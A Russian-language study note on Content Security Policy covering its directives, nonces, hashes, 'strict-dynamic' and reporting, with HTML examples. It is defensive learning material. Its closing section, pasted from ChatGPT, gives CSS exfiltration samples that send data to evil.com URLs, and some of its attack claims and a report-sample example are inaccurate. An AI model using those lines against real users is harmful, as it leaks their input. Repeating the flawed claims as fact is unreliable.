-  [[#^d3e26d|Зачем нужен CSP?]]
-  [[#^3316e9|Как добавить CSP на страницу?]]
-  [[#^523479|Какой способ добавления на страницу предпочтительнее?]]
-  [[#^614b07|От каких угроз защищает CSP?]]
-  [[#^bdfb6a |Какие существуют директивы?]]
-  Какие существуют значения директив?
-  [[#^880702 |Что можно сделать, если очень много sources нужно перечислять?]]
-  Что такое `nonce` и `hashes` и как они генерируются?
-  [[#^a13c65 |В чем состоит идея `nonce` когда злоумышленник нашел способ внедрить скрипт?]]
-  [[#^afca62 |Как разрешить inline обработчики событий, не используя `unsafe-inline`?]]
-  [[#^6720cd |Как разрешить скриптам загружать скрипты, не перечисленные в CSP?]]
-  [[#^cd848d  |Как можно это обхитрить в скрипте, даже если не стоит `strict-dynamic`?]]


Позволяет контролировать ресурсы, которые пользовательскому агенту разрешено загружать для данной страницы. ^d3e26d

Встраивается на страницу с помощью заголовка `Content-Security-Policy` или мета-тега 
`<meta http-equiv="Content-Security-Policy">` ^3316e9

Способ с заголовком более предпочтительный, так как если у злоумышленника получится вставить какой-либо скрипт до `<meta>` тега, то этот скрипт выполнится. ^523479

Позволяет защититься от таких атак как: ^614b07
- XSS
		`Content-Security-Policy: script-src 'self'`
		Даже если `innerHTML` вставил `<script>`, он не выполнится, тк блокируется политикой CSP
- Clickjacking
		`Content-Security-Policy: frame-ancestors 'none'`
		Запрещает встраивание вашего сайта в чужие `iframe`.

#### Директивы

^bdfb6a

Директивы управляют местами, из которых могут быть загружены определенные типы ресурсов.

#### `default-src`
Является фоллбеком для других директив, если они не установлены

Пример:
```
Content-Security-Policy: default-src 'self'
```

Позволяет загружать ресурсы только с того же домена, с которого был загружен сайт.

```
Content-Security-Policy: default-src 'self' *.trusted.com
```

Разрешить получение контента с текущего домена, доверенного домена и всех его поддоменов.

```
Content-Security-Policy: default-src 'none'
```

Запрещает какую-либо загрузку ресурсов

#### `img-src`
Указывает допустимые источники изображений и значков.

#### `font-src`
Указывает допустимые источники для шрифтов, загружаемых с помощью `@font-face.`

#### `media-src`
Указывает допустимые источники для загрузки мультимедиа с помощью элементов `<audio>`, `<video>` и `<track>`.

#### `object-src`
Указывает допустимые источники для элементов `<object>` и `<embed>`.

#### `manifest-src`
Указывает допустимые источники файлов манифеста приложения.

#### `connect-src`
Ограничивает URL-адреса, которые можно загрузить с помощью интерфейсов скриптов.

Это касается всех типов запросов, которые отправляются с помощью JavaScript, таких как:

- XMLHttpRequest (XHR)
- Fetch API
- WebSocket
- EventSource (для Server-Sent Events)
- Navigator.sendBeacon()


#### `frame-src`
Указывает допустимые источники для вложенных контекстов просмотра, загруженных в такие элементы, как `<frame>` и `<iframe>`.


#### `worker-src`
Указывает допустимые источники для `Worker`, `SharedWorker` или `ServiceWorker` скриптов.

`child-src`
Определяет допустимые источники для WebWorkers и вложенных контекстов просмотра, загружаемых с использованием таких элементов, как `<frame>` и `<iframe>`.

Запасной вариант для `frame-src` и `worker-src`.

#### `style-src`
Указывает допустимые источники для таблиц стилей.

Запасной вариант для `style-src-elem` и `style-src-attr`.

#### `style-src-elem`
Указывает допустимые источники для `<style>` элементов CSS и `<link>` элементов с расширением `rel="stylesheet"`.

Пример:
```
Content-Security-Policy: style-src-elem 'self' https://cdn.example.com;
```

Разрешает загрузку стилей только с текущего домена `('self')` и с `https://cdn.example.com`

```
<link rel="stylesheet" href="https://example.com/styles.css">
```

#### `style-src-attr`
Указывает допустимые источники для встроенных стилей, применяемых к отдельным элементам DOM.

Пример:

```
Content-Security-Policy: style-src-attr 'none';
```

Запрещает использование встроенных стилей в атрибутах.

```
<div style="color: red;">This is a red text.</div>
```


#### `script-src`
Указывает допустимые источники для ресурсов JavaScript и WebAssembly.

Запасной вариант для `script-src-elem` и `script-src-attr`.

`script-src-elem`
Указывает допустимые источники для `<script>` элементов JavaScript.

Пример:
```
Content-Security-Policy: script-src-elem 'self' https://cdn.example.com;
```

Разрешает загрузку скриптов только с текущего домена `('self')` и с `https://cdn.example.com`

```
<script src="https://example.com/script.js"></script>
```


#### `script-src-attr`
управляет выполнением **инлайновых обработчиков событий**

Пример:
```
Content-Security-Policy: script-src-attr 'none';
```

Запрещает выполнение инлайновых скриптов по типу:

```
<button onclick="alert('Clicked!')">Click me</button>
```

Еще примеры:

```
Content-Security-Policy: default-src 'self'; img-src *; script-src userscripts.example.com
```

- Разрешает использование ресурсов только с текущего домена
- Для изображения разрешены любые домены.
- Для скриптов разрешен только `userscripts.example.com`

#### `frame-ancestors`
Определяет допустимых родителей, которые могут встраивать эту страницу в 
`<frame>`, `<iframe>`, `<object>`, или `<embed>`.

Установка этой директивы в значение `none` аналогична `X-Frame-Options: deny` (которая также поддерживается в старых браузерах).

```
Content-Security-Policy: frame-ancestors 'none';

Content-Security-Policy: frame-ancestors 'self' https://example.org https://example.com https://store.example.com;
```

## Синтаксис значений CSP:

#### `'none'`
 Значение  указывающее, что определенный тип ресурса должен быть полностью заблокирован


#### `'self'`
Ресурсы данного типа могут быть загружены только из того же источника , что и документ.


#### `<host-source>`

URL -адрес или IP-адрес хоста , который является допустимым источником ресурса.

Протокол (схема), номер порта и путь необязательны.

При сопоставлении протоколов разрешены безопасные обновления. Например:
- `http://example.com` также позволит использовать ресурсы из `https://example.com`
- `ws://example.org` также разрешит ресурсы из `wss://example.org`.

Если протокол не указан, используется протокол происхождения документа.

Подстановочные знаки ( `'*'`) можно использовать для поддоменов, адреса хоста и номера порта, указывая, что все допустимые значения каждого из них действительны. Например:

- `http://*.example.com`разрешает ресурсы из любого поддомена `example.com`по протоколу HTTP или HTTPS.

Пути, которые заканчиваются на `/`соответствуют любому пути, префиксом которого они являются. Например:

- `example.com/api/`разрешит ресурсы из `example.com/api/users/new`.

Пути, которые не заканчиваются на, `/`сопоставляются точно. Например:
- `https://example.com/file.js`разрешает ресурсы из `https://example.com/file.js`, но не `https://example.com/file.js/file2.js`.


#### `<scheme-source>`
Протокол (схема) , например, `https:` . Двоеточие обязательно.

Secure:
- `http:`также разрешит загрузку ресурсов с использованием HTTPS
- `ws:`также разрешит загрузку ресурсов с использованием WSS.


#### `'nonce-<nonce_value>'`

Это значение состоит из строки, nonce-за которой следует строка в кодировке base64 . Эта строка — случайное значение, которое сервер генерирует для каждого ответа HTTP. 

Это удобно, если у нас очень много источников типа `example.com` `example2.com` и тд
Чтобы не перечислять их всех, мы можем просто всем скриптам дать `nonce`
Например: ^880702

1. **Сервер генерирует уникальное значение (nonce)** для каждого запроса. Это значение должно быть случайным и изменяться при каждом обновлении страницы.

```js
function content(nonce) {
  return `
    <script nonce="${nonce}" src="/main.js"></script>
    <script nonce="${nonce}">console.log("hello!");</script>
    <h1>Hello world</h1> 
    `;
}

app.get("/", (req, res) => {
  const nonce = crypto.randomUUID();
  res.setHeader("Content-Security-Policy", `script-src 'nonce-${nonce}'`);
  res.send(content(nonce));
});
```


2. **Nonce добавляется в CSP**:
```
Content-Security-Policy: script-src 'nonce-abc123';
```
*Здесь `abc123` — это пример значения nonce.
*
3. **Nonce добавляется в теги `<script>` или `<style>`** на странице:
```html
<script nonce="abc123">
  console.log("This script is allowed!");
</script>
```
4. **Браузер проверяет nonce**:
- Если значение nonce в теге совпадает с указанным в CSP, скрипт или стиль выполняется.
- Если nonce не совпадает или отсутствует, выполнение блокируется.

*Если директива содержит nonce и `unsafe-inline`, то браузер игнорирует `unsafe-inline`.*

_Идея заключается в том, что даже если злоумышленник сможет вставить какой-то JavaScript на страницу, он не будет знать, какой nonce собирается использовать сервер, поэтому браузер откажется запускать скрипт._ ^a13c65

https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#nonces

Работает только для `<script/>` и `<style>`, например для `<img/>` такое работать не будет:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta 
	    http-equiv="Content-Security-Policy" 
	    content="default-src none; img-src 'nonce-1234';"
	>
</head>
<body>
<img src="test.png" nonce="1234" />
</body>
</html>
```

Для инлайн скриптов работает:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; script-src 'nonce-1234';"
  >
</head>
<body>
<script nonce="1234">
  alert('Hello')
</script>
</body>
</html>
```

Не работает для инлайн скрипта в обработчиках:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; script-src 'nonce-1234';"
  >
</head>
<body>
<button onclick="alert('Hello')" nonce="1234">Click</button>
</body>
</html>
```

Для инлайн стилей работает
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; style-src 'nonce-1234';"
  >
  <style nonce="1234">
    body {
      background-color: red;
    }
  </style>
</head>
<body>

</body>
</html>
```

Для загруженых стилей работает
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; style-src 'nonce-1234';"
  >
  <link rel="stylesheet" href="main.css" nonce="1234"/>
</head>
<body>

</body>
</html>
```

Не работает для аттрибутов style
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; style-src 'nonce-1234';"
  >
</head>
<body>
<button style="background-color: red" nonce="1234">Click</button>
</body>
</html>
```

По поводу *Если директива содержит nonce и `unsafe-inline`, то браузер игнорирует `unsafe-inline`.*
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; style-src 'nonce-1234' 'unsafe-inline' ;"
  >
  <style nonce="1234">
    body {
      background-color: red;
    }
  </style>
  <style >
    body {
      background-color: blue;
    }
  </style>
</head>
<body>

</body>
</html>
```
Будет выкидывать ошибку:
```
Refused to apply inline style because it violates the following Content Security Policy directive: "style-src 'nonce-1234' 'unsafe-inline'". Note that 'unsafe-inline' is ignored if either a hash or nonce value is present in the source list.
```
И `body` все равно будет красным


#### `'<hash_algorithm>-<hash_value>'`

Это значение состоит из строки, идентифицирующей алгоритм хеширования, за которой следует -, а затем — закодированная в base64 строка, представляющая значение хеширования.

Идентификатор алгоритма хеширования должен быть одним из `sha256`, `sha384`, или `sha512`.
Значение хэша представляет собой хэш ресурса `<script>` или `<style>` в кодировке base64, рассчитанный с использованием одной из следующих хэш-функций: `SHA-256`, `SHA-384` или `SHA-512`.

1. **Сервер вычисляет хеш** содержимого встроенного скрипта или стиля.
Например у нас скрипт
```html
<script>alert('Hello')</script>
```

Вычисляем хеш:
```bash
echo -n "alert('Hello')" | openssl sha256 -binary | openssl base64
```

```
xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA=
```


2. **Хеш добавляется в CSP**:
```
Content-Security-Policy: script-src 'sha256-xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA=';
```

3. Теперь этот скрипт можно вставлять в страницу
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; script-src 'sha256-xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA=';"
  >
</head>
<body>
<script>alert('Hello')</script>
</body>
</html>
```

Если скрипт будет загружаться, то нужно добавить атрибут `integrity`

```html
<script src="./main.js" integrity="sha256-xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA="></script>
```

4. **Браузер проверяет хеш**:
 - Если хеш содержимого встроенного скрипта или стиля совпадает с указанным в CSP, выполнение разрешается.
- Если хеш не совпадает, выполнение блокируется.

*Если директива содержит хэш и `unsafe-inline`, то браузер игнорирует `unsafe-inline`.*

Но это все равно не будет работать с inline-handlers, чтобы заработало, нужно добавлять 'unsafe-hashes'

https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#hashes

#### `'unsafe-eval'`
По умолчанию, если CSP содержит `default-src` или `script-src` директиву, то функции JavaScript, которые вызываюь свои аргументы как JavaScript, отключены. Это включает в себя `eval()`, code аргумент для `setTimeout()` или `Function()` конструктор.

Для снятия этой защиты можно использовать ключевое `unsafe-eval` слово, что позволит выполнять динамическую оценку строк как JavaScript.

https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#eval_and_similar_apis

#### `'wasm-unsafe-eval'`
По умолчанию, если CSP содержит директиву `default-src` или `script-src`, то странице не будет разрешено компилировать WebAssembly с использованием таких функций, как `WebAssembly.compileStreaming()`.

Ключевое `wasm-unsafe-eval` слово может быть использовано для отмены этой защиты. Это гораздо более безопасная альтернатива `'unsafe-eval'`, поскольку она не позволяет выполнять JavaScript.


#### `'unsafe-inline'`
По умолчанию, если CSP содержит `default-src` или `script-src` директиву, то встроенный JavaScript не может быть выполнен. Это включает в себя:

-  инлайновые `<script>` теги
- инлайновые event handler аттрибуты
- `javascript:` URLs.

Аналогично, если CSP содержит `default-src` или `style-src` директиву, то встроенный CSS не будет загружен, включая:

- инлайновые `<style>` теги
- `style` атрибуты.

Для снятия этой защиты можно использовать ключевое `unsafe-inline` слово, что позволит загрузить все эти формы.

https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#inline_javascript

#### `'unsafe-hashes'`
По умолчанию, если CSP содержит директиву `default-src` или `script-src`, то встроенные атрибуты обработчика событий, такие как `onclick` и встроенные `style` атрибуты, не могут выполняться.

Выражение `'unsafe-hashes'` позволяет браузеру использовать хэш-выражения для встроенных обработчиков событий и `style` атрибутов.  ^afca62

Предположим, у нас есть такой HTML-код:
```
<button onclick="alert('Hello')">Click</button>
```

Обычно CSP блокирует inline-обработчики onclick, но если мы добавим unsafe-hashes, то сможем разрешить их с помощью хэша.

```
Content-Security-Policy: script-src 'self' 'unsafe-hashes' 'sha256-xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA=' (хэш "alert('Hello')")
```

Если значение хэша совпадает с хэшем значения атрибута встроенного обработчика событий или `style` значения атрибута, то коду будет разрешено выполниться.
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; script-src 'unsafe-hashes' 'sha256-xsuTGwM1pbHxJt6Bcu7KLls/Z+Q7K2yHs6kiFf8OBkA=';"
  >
</head>
<body>
<button onclick="alert('Hello')">Click</button>
</body>
</html>
```


**Предупреждение:** значение `'unsafe-hashes'`небезопасно.
В частности, он позволяет провести атаку, в которой содержимое атрибута обработчика встроенных событий внедряется в документ как встроенный `<script>`элемент. Предположим, что встроенный обработчик событий:

```
<button onclick="transferAllMyMoney()">Transfer all my money</button>
```

Если злоумышленник сможет внедрить встроенный `<script>`элемент, содержащий этот код, CSP разрешит его автоматическое выполнение.

Однако `'unsafe-hashes'`гораздо безопаснее, чем `'unsafe-inline'`.


#### `'inline-speculation-rules'`
По умолчанию, если CSP содержит `default-src` или `script-src` директиву, то встроенный JavaScript не может быть выполнен. 'inline-speculation-rules' Позволяет браузеру загружать встроенные `<script>` элементы, имеющие `type` атрибут `speculationrules`.

TODO: https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API


#### `'strict-dynamic'`

`'strict-dynamic'`  распространяет доверие, оказываемое скрипту с помощью `nonce` или `hash` , на скрипты, которые этот скрипт динамически загружает, например, создавая новые `<script>` теги с помощью` Document.createElement()` и затем вставляя их в документ с помощью `Node.appendChild()`. ^6720cd

Допустим, у нас есть такой скрипт:
```js
// main.js
const script = document.createElement("script");  
script.src = 'http://example.com/js'  
document.body.append(script)
```

Мы можем добавить этот сайт в список разрешенных, но тогда если что-то поменяется, нужно лезть и CSP: 
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; script-src 'self' example.com"
  >
</head>
<body>
<script src="main.js"></script>
</body>
</html>
```

Eсли мы дадим этому скрипту `nonce`  или `hash`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; script-src 'nonce-1234'"
  >
</head>
<body>
<script src="main.js" nonce="1234"></script>
</body>
</html>
```
Все равно будет ругаться, 
```
Refused to load the script 'http://example.com/js' because it violates the following Content Security Policy directive: "script-src 'nonce-1234'". Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback
```

Чтобы "доверится" скриптам имеющим `nonce` или `hash`, следует добавить `strict-dynamic`
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; script-src 'strict-dynamic' 'nonce-1234'"
  >
</head>
<body>
<script src="main.js" nonce="1234"></script>
</body>
</html>
```

Таким образом, **все скрипты, загруженные этим скриптом**, тоже станут доверенными, даже если их нет в списке `script-src`

Такой проблемы не будет, если мы загружаем скрипт, который подходит под `script-src`
Например:
```js
const script = document.createElement("script");  
script.src = '/second.js'  
document.body.append(script)
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; script-src 'self'"
  >
</head>
<body>
<script src="main.js"></script>
</body>
</html>
```
`main.js` загружает `second.js`, который подпадает под `'self'` и поэтому все ок

Тут кстати можно немного схитрить, если мы имеем такое CSP: ^cd848d
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
          http-equiv="Content-Security-Policy"
          content="default-src none; script-src 'nonce-1234'"
  >
</head>
<body>
<script src="main.js" nonce="1234"></script>
</body>
</html>
```

Так уже не прокатит, так как `second.js` но подходит под csp 
```js
const script = document.createElement("script");  
script.src = 'second.js'  
document.body.append(script)

Refused to load the script 'http://localhost:3000/second.js' because it violates the following Content Security Policy directive: "script-src 'nonce-1234'". Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.
```

Но если дать ему этот nonce, то все будет ок:
```js
const script = document.createElement("script");
script.src = 'second.js'
script.nonce = document.currentScript.nonce // <- 
document.body.append(script)
```



### `report-sample`
`report-sample` — это модификатор для **директив CSP**, который добавляет **фрагмент заблокированного кода** в отчёты о нарушениях политики CSP.

Обычно, когда браузер отправляет отчёт о нарушении CSP (`report-uri` или `report-to`), он указывает **только источник проблемы** (например, URL скрипта). Но если включить `report-sample`, браузер также отправит **кусочек самого заблокированного кода** — это помогает анализировать XSS-атаки и другие угрозы.


Допустим, у нас есть такой скрипт:

```
<script> eval("alert('XSS')"); </script>
```

Если CSP запрещает `eval()`, браузер отправит отчёт о нарушении.

**Без `report-sample`** (обычный отчёт CSP):
```
{
  "csp-report": {
    "blocked-uri": "inline",
    "violated-directive": "script-src 'self'",
    "source-file": "https://example.com/index.html"
  }
}
```
Здесь видно, что проблема — инлайн-скрипт, но непонятно, **какой именно код был заблокирован**.

**С `report-sample`** в CSP:
```
Content-Security-Policy: script-src 'self' 'unsafe-eval'; report-uri /csp-report; report-sample
```


Теперь браузер отправит в отчёте фрагмент кода:
```
{
  "csp-report": {
    "blocked-uri": "inline",
    "violated-directive": "script-src 'self'",
    "source-file": "https://example.com/index.html",
    "sample": "eval(\"alert('XSS')\")"
  }
}
```
Теперь видно, **какой именно код вызвал нарушение**. (содержащее первые 40 символов заблокированного ресурса)

`report-sample` можно применять к:
- `script-src` (для анализа заблокированных скриптов)
- `style-src` (для заблокированных стилей)
- `default-src` (если он запрещает `script-src` или `style-src`)

```
Content-Security-Policy: script-src 'self'; style-src 'self'; report-uri /csp-report; report-sample

```



## CSP in workers

Workers в целом **не управляются** политикой безопасности контента документа (или родительского worker), который их создал. Чтобы указать политику безопасности контента для worker, установите `Content-Security-Policy` заголовок ответа для запроса, который запросил сам скрипт worker.

Исключением является случай, когда источник скрипта-воркера является глобально уникальным идентификатором (например, если его URL имеет схему данных или blob). В этом случае воркер наследует политику безопасности контента документа или воркера, которые его создали.



# Пример полной политики CSP

```
Content-Security-Policy: script-src 'nonce-ABC123' 'strict-dynamic' https:; object-src 'none'; base-uri 'none';

```
- `'nonce-ABC123'` — разрешает выполнение инлайн-скриптов с этим `nonce`.
- `'strict-dynamic'` — разрешает всем скриптам, загруженным доверенным скриптом, тоже загружать другие скрипты.
- `https:` — допускает загрузку только с HTTPS (без этого любые `nonce`-скрипты смогут грузить **любые источники**, что небезопасно).
- `object-src 'none'; base-uri 'none'` — дополнительные ограничения для безопасности.


# Дополнительно:


Почему это сделано для тегов `style` тоже? 
Со `script` понятно, там можно внедрить внедосный скрипт
Но `style` что может сделать плохого?

ChatGPT:
### 1. **CSS Exfiltration (утечка данных)**

CSS-свойства, такие как `:visited`, `content` (в `::before`/`::after`), `display: none`, позволяют определять, какие ссылки посещал пользователь. Злоумышленник может загрузить стилизованный контент и анализировать поведение браузера.

**Пример атаки через `:visited`**:

```
a { color: black; } a:visited { color: red; }
```

Затем злоумышленник с помощью JavaScript может измерять цвет ссылки и определить, посещал ли пользователь определённый сайт.

### 2. **CSS Injection и Clickjacking**

Если злоумышленник может внедрить `<style>`, он может изменить внешний вид страницы. Например, скрыть важные элементы (например, кнопки выхода) или накрыть прозрачными слоями фальшивые кнопки (`opacity: 0`, `pointer-events: none`), что может привести к краже данных.

### 3. **Загрузка вредоносных шрифтов (Remote Font Attack)**

Через CSS можно подгружать удалённые шрифты с сервера злоумышленника:

```
@font-face { font-family: 'EvilFont'; src: url('https://evil.com/steal.ttf'); }
```

Если злоумышленник контролирует шрифт, он может подменять символы и вводить пользователя в заблуждение (например, подменить букву "O" на "0" в формах).

### 4. **CSS Keylogging (отслеживание набора текста)**

Некоторые браузеры позволяют использовать `:focus` + `:nth-child(n)` для изменения стиля отдельных букв в текстовом поле, что может утечь через JavaScript.

**Пример:**

```
input:focus:nth-child(1) { background: url('https://evil.com/leak?key=1'); } input:focus:nth-child(2) { background: url('https://evil.com/leak?key=2'); }
```

Злоумышленник может узнавать последовательность вводимых символов.


Links:
https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP



TODO:
[`report-to`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
### [Навигационные директивы](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#navigation_directives)
### [Документ директив](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#document_directives)